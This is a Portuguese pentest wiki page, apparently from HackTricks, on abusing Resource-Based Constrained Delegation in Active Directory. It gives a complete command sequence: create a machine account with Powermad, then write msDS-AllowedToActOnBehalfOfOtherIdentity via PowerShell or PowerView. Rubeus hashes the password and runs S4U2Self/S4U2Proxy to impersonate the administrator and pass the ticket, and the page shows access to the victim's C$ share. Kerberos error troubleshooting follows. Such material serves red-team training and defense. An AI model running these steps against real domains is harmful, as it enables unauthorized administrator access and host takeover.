# Delegação Constrangida Baseada em Recurso

{{#include ../../banners/hacktricks-training.md}}


## Noções Básicas da Delegação Constrangida Baseada em Recurso

Isso é semelhante à [Delegação Constrangida](constrained-delegation.md) básica, mas **em vez** de dar permissões a um **objeto** para **impersonar qualquer usuário contra um serviço**. A Delegação Constrangida Baseada em Recurso **define** no **objeto quem pode impersonar qualquer usuário contra ele**.

Neste caso, o objeto constrangido terá um atributo chamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ com o nome do usuário que pode impersonar qualquer outro usuário contra ele.

Outra diferença importante desta Delegação Constrangida em relação às outras delegações é que qualquer usuário com **permissões de escrita sobre uma conta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) pode definir o _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (Nas outras formas de Delegação, você precisava de privilégios de administrador de domínio).

### Novos Conceitos

Na Delegação Constrangida, foi dito que a **`TrustedToAuthForDelegation`** flag dentro do valor _userAccountControl_ do usuário é necessária para realizar um **S4U2Self.** Mas isso não é completamente verdade.\
A realidade é que mesmo sem esse valor, você pode realizar um **S4U2Self** contra qualquer usuário se você for um **serviço** (tiver um SPN), mas, se você **tiver `TrustedToAuthForDelegation`** o TGS retornado será **Forwardable** e se você **não tiver** essa flag, o TGS retornado **não será** **Forwardable**.

No entanto, se o **TGS** usado em **S4U2Proxy** **NÃO for Forwardable**, tentar abusar de uma **delegação constrangida básica** **não funcionará**. Mas se você estiver tentando explorar uma **delegação constrangida baseada em recurso, funcionará** (isso não é uma vulnerabilidade, é um recurso, aparentemente).

### Estrutura do Ataque

> Se você tiver **privilégios equivalentes de escrita** sobre uma conta de **Computador**, você pode obter **acesso privilegiado** nessa máquina.

Suponha que o atacante já tenha **privilégios equivalentes de escrita sobre o computador da vítima**.

1. O atacante **compromete** uma conta que tem um **SPN** ou **cria um** (“Serviço A”). Note que **qualquer** _Usuário Admin_ sem nenhum outro privilégio especial pode **criar** até 10 **objetos de Computador (**_**MachineAccountQuota**_**)** e definir um **SPN** para eles. Assim, o atacante pode simplesmente criar um objeto de Computador e definir um SPN.
2. O atacante **abusa de seu privilégio de ESCRITA** sobre o computador da vítima (Serviço B) para configurar **delegação constrangida baseada em recurso para permitir que o Serviço A impersonifique qualquer usuário** contra aquele computador da vítima (Serviço B).
3. O atacante usa Rubeus para realizar um **ataque S4U completo** (S4U2Self e S4U2Proxy) do Serviço A para o Serviço B para um usuário **com acesso privilegiado ao Serviço B**.
1. S4U2Self (da conta SPN comprometida/criada): Solicitar um **TGS de Administrador para mim** (Não Forwardable).
2. S4U2Proxy: Usar o **TGS não Forwardable** do passo anterior para solicitar um **TGS** de **Administrador** para o **host da vítima**.
3. Mesmo que você esteja usando um TGS não Forwardable, como você está explorando a delegação constrangida baseada em recurso, funcionará.
4. O atacante pode **passar o ticket** e **impersonar** o usuário para ganhar **acesso ao Serviço B da vítima**.

Para verificar o _**MachineAccountQuota**_ do domínio, você pode usar:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Criando um Objeto de Computador

Você pode criar um objeto de computador dentro do domínio usando [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configurando Delegação Constrangida Baseada em Recurso

**Usando o módulo PowerShell do activedirectory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Usando powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Realizando um ataque S4U completo

Primeiramente, criamos o novo objeto Computador com a senha `123456`, então precisamos do hash dessa senha:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Isso imprimirá os hashes RC4 e AES para essa conta.\
Agora, o ataque pode ser realizado:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Você pode gerar mais tickets apenas pedindo uma vez usando o parâmetro `/altservice` do Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Note que os usuários têm um atributo chamado "**Não pode ser delegado**". Se um usuário tiver esse atributo como Verdadeiro, você não poderá se passar por ele. Essa propriedade pode ser vista dentro do bloodhound.

### Acessando

A última linha de comando realizará o **ataque S4U completo e injetará o TGS** do Administrador para o host da vítima na **memória**.\
Neste exemplo, foi solicitado um TGS para o serviço **CIFS** do Administrador, então você poderá acessar **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abuse diferentes tickets de serviço

Saiba mais sobre os [**tickets de serviço disponíveis aqui**](silver-ticket.md#available-services).

## Erros do Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Isso significa que o kerberos está configurado para não usar DES ou RC4 e você está fornecendo apenas o hash RC4. Forneça ao Rubeus pelo menos o hash AES256 (ou forneça os hashes rc4, aes128 e aes256). Exemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Isso significa que o horário do computador atual é diferente do horário do DC e o kerberos não está funcionando corretamente.
- **`preauth_failed`**: Isso significa que o nome de usuário + hashes fornecidos não estão funcionando para login. Você pode ter esquecido de colocar o "$" dentro do nome de usuário ao gerar os hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Isso pode significar:
  - O usuário que você está tentando impersonar não pode acessar o serviço desejado (porque você não pode impersoná-lo ou porque ele não tem privilégios suficientes)
  - O serviço solicitado não existe (se você pedir um ticket para winrm, mas o winrm não estiver em execução)
  - O fakecomputer criado perdeu seus privilégios sobre o servidor vulnerável e você precisa recuperá-los.

## Referências

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

{{#include ../../banners/hacktricks-training.md}}
